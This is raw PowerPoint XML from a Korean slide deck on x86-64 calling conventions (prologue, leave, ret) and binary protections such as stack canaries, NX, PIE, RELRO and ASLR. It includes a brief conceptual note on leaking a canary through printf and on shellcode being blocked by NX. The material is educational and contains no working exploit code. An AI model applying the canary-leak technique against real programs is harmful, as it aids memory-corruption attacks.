              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>system V AMD64 ABI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 호출 규약을 확인해보겠습니다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함수 호출 과정에서 프롤로그</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>시작</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400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와 에필로그</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>끝</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>과정을 확인하겠습니다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F5F28E-27A6-72FD-57A5-A1A00FA48C1A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="251129" y="2928252"/>
            <a:ext cx="7835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1.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 호출 시 진입과 동시에 복귀 후 실행할 명령의 주소</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(0x7ffff7de0d68)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>를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rsp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>에 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>push </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>한다</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>. </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="20" name="그래픽 19" descr="오른쪽 화살표 단색으로 채워진">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7DDCB8EF-57CC-F216-3DBA-A9AA24868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6888" y="4112720"/>
            <a:ext cx="914400" cy="9144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3CE7155-7147-E580-2B08-844378E59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07" y="3670112"/>
            <a:ext cx="5160230" cy="15817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C14413C-D615-0F37-513F-C1095C979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439" y="3445099"/>
            <a:ext cx="5423672" cy="203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9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06C14-8554-7401-BDDD-56123E92D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B5C7EA2-0F36-7B26-DBB4-6FF5B0197CF2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E20A2-3728-9D13-D7E2-0EB3731188C6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="5991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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="3600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial Nova Light" panose="020B0304020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Calling Convention</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" sz="36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E812D3-F830-B646-8B36-E1C3D20FB9C9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D42FA5-F95E-36EE-1FEE-18B314816D82}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="198878" y="1487219"/>
            <a:ext cx="7835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2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>이전 함수의 프레임 포인터 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(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rbp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400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를 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>push</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>한다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</a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="20" name="그래픽 19" descr="오른쪽 화살표 단색으로 채워진">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E4C25AF8-9C1A-612C-F062-0E8705EA4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1895" y="2514600"/>
            <a:ext cx="914400" cy="914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F98B90-E22B-0B4A-D673-65832DE1F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78" y="1984565"/>
            <a:ext cx="4990759" cy="18788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51C0AC-A84A-2203-96BD-89A028D7CB9E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="4158804"/>
            <a:ext cx="55692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4. sub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rsp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, 0x10 =&gt; main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함수에서 사용할 스택 영역 확보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1A9CCED-8311-23AA-5234-86CF1BD7E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034" y="1984565"/>
            <a:ext cx="5653088" cy="302995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3FDCAB9-7805-FC76-F86B-104E700E8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78" y="4569619"/>
            <a:ext cx="5126317" cy="1949990"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="18" name="그래픽 17" descr="오른쪽 화살표 단색으로 채워진">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6015A88F-BFD5-88C2-DFB4-5BF7EDF5B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937612">
            <a:off x="5389230" y="3665456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3C7B54-C994-F6CC-5E80-F8523952EDD5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6268381" y="1514041"/>
            <a:ext cx="556925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3.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rsp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값을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rbp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>에 넣어준다 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>=&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>새로운 함수의 프레임 포인터 생성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731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336A0-0A3F-A1D4-ABBE-ECF1932B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BFD19E0-73DB-E969-C693-7D1CC5DA4FF1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1825B3-C556-622F-D2FB-0B197D112059}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="5991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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="3600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial Nova Light" panose="020B0304020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Calling Convention</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" sz="36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D1BFD-2BE0-081F-9278-6A3F9500A60D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82E70B-5F91-0957-5EA4-9E0296157B80}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1357997"/>
            <a:ext cx="783599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에필로그</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>함수 복귀</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400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는 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>func2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>를 마치고 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>func1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>로 복귀하는 과정입니다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leave, ret </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>명령만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알면됩니다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20" name="그래픽 19" descr="오른쪽 화살표 단색으로 채워진">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1EF6BDB1-28A1-8A43-DACE-9A975D021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4698" y="3726251"/>
            <a:ext cx="914400" cy="914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7815DC5-E2E5-A49A-1AF2-8BDCB00DA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29" y="3070232"/>
            <a:ext cx="5150378" cy="23903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245D61-EC2B-BFC9-31D1-F143D5801C5D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132079" y="2247717"/>
            <a:ext cx="78359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leave : mov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rsp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rbp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> + pop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rbp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이전 함수의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rbp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값을 복구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214285A-97A4-D002-40E7-587C93565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489" y="1958161"/>
            <a:ext cx="5604757" cy="416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3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F3169-7B10-0448-D30F-27116AA4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1DEF91-2D4A-D3F1-6D46-DB9B8F639A9E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F58D4-D19C-3F56-FC0C-45EE7F3E73D6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="5991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</a:rPr>
              <a:t>프로그램 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="3600" spc="-300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="3600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial Nova Light" panose="020B0304020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Calling Convention</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" sz="36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DF18A-62F7-515E-113C-CCDFD704CDCA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="117305"/>
            <a:ext cx="743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2,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20" name="그래픽 19" descr="오른쪽 화살표 단색으로 채워진">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0525C21D-29C3-2364-2106-991B45DC7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9761" y="3743669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19113D-BA66-B408-87F1-8277FD6A5CCA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1351058"/>
            <a:ext cx="78359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ret : pop rip =&gt;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rsp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 스택에서 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>로 값을 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>pop </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>시킵니다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main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 진입 때 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>push </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>한 값이 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>로 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>pop </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>되면서 함수 복귀가 완료됩니다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76CF01-6CB5-81F3-EB23-6B820C435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407" y="2229800"/>
            <a:ext cx="4992492" cy="37791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EEFB351-B0DD-2961-98E6-3CDC523335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664" y="2229800"/>
            <a:ext cx="5334137" cy="377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3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3336-75CE-AA0F-544D-9E19AF7C0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A08147-461E-A8FC-A2F9-E66445ADAA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4720" y="0"/>
            <a:ext cx="871728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875D773-2282-8CE5-4DC8-115901FE287E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58A92-43C1-47F3-F231-5A11BDF9563B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1998168" y="3124005"/>
            <a:ext cx="1877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보호기법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8ACDB6-4775-1543-0460-E6E9468C7776}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="904240" y="3121223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EF5D03F-DED9-FCA4-5E1B-57B9160F6A48}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="904240" y="282313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AC62937-8701-FEE0-7251-58BBF59E231E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="904240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057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BC03D-67E0-E9DF-E6B3-3FA3DEF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EFC8CA8-5C3E-330E-A014-E863B7BEFC65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171A91-1923-5519-285E-BF2C2EC35CD2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="1943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보호기법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D2749-4F49-1F0A-C514-7C5B5DF6FD17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F7FC8C-CB26-C06A-2111-FB12E0C611F2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1351058"/>
            <a:ext cx="1166803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유저모드에서 실행되는 프로그램에는 여러 보호기법이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그 중에 대표적으로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Stack Canary, NX(Never </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" b="1" spc="-150" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>eXecute</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" b="1" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>), PIE, RELRO</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>가 있고 추가적으로 커널에서 지원해주는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ASLR(Address Space Layout Randomization) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>이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checksec</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> [</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>프로그램</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>] </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>명령으로 보호기법 확인이 가능합니다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A54F170-A078-882B-8E0B-64A8A0887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965" y="3175716"/>
            <a:ext cx="5680812" cy="184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78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CA9D2-E840-4F9C-AAAA-AA092A0B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31AC53-447D-703C-288C-57C82FB9ABB9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5471DA-8166-0E53-B3A4-FB9225E2F5FE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="4131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보호기법 </a:t>
            </a:r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– Stack Canary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7A152-5494-BE20-8FDB-5F7CAC9319C5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89114-FBCC-0096-3F34-97E2C5A5B052}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1351058"/>
            <a:ext cx="1166803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스택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카나리</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 보호기법은 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>RBP-0x8 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>위치에 무작위 값을 넣어주는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보호기법입니다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함수 복귀 시 해당 값이 변조되었을 경우 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>RBP &amp; RET </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>가 변조되었다고 판단하여 프로그램을 비정상적으로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종료시킵니다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하지만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printf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함수는 출력 시 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>0x00(null) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>값을 인식하여 출력을 끊기 때문에 만약 출력할 문자열이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카나리</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 값과 이어져 있다면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카나리</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 값 유출이 가능합니다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7F9173E-1C5F-1F04-E2C7-B6556D100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00" r="27866" b="27492"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="743897" y="2728912"/>
            <a:ext cx="3366549" cy="389166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7657668-93F0-825B-9B32-1115157C5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798" y="4674746"/>
            <a:ext cx="5819775" cy="111442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670B20DF-B547-9A32-D8A3-30AA31FF8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798" y="2755882"/>
            <a:ext cx="47053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2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65277-DDA3-9B7B-0C3D-B1990C33A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0A33BD-B475-E54E-7D07-28A344A00F61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718C7-4018-F609-B3F9-0E46F7D5D7BC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="2571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보호기법 </a:t>
            </a:r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NX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0A833-5E03-770D-C7EB-CB71E851ECE7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43309-9D2B-8D0C-D442-C9281722FBC0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1351058"/>
            <a:ext cx="116680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NX(Never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eXecute</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>보호기법은 프로그램 런타임 간 사용되는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스택영역에</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 실행권한을 부여하지 않는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보호기법입니다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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, RTS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>같이 스택에 쉘 코드를 삽입하여 복귀주소를 변조한 경우 스택에 실행권한이 없어 쉘 코드가 실행되지 않습니다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85B5CD-A70D-5017-2B52-92821285A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60" y="3036978"/>
            <a:ext cx="5407049" cy="240245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12AC2BC-C0A5-9689-1796-8B6B5B50D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307" y="3036978"/>
            <a:ext cx="5201436" cy="24024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78BCF7-B75E-EC74-6FC0-3898ECE5B920}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2375488" y="2564602"/>
            <a:ext cx="1071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>
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>NX </a:t>
            </a:r>
            <a:r>
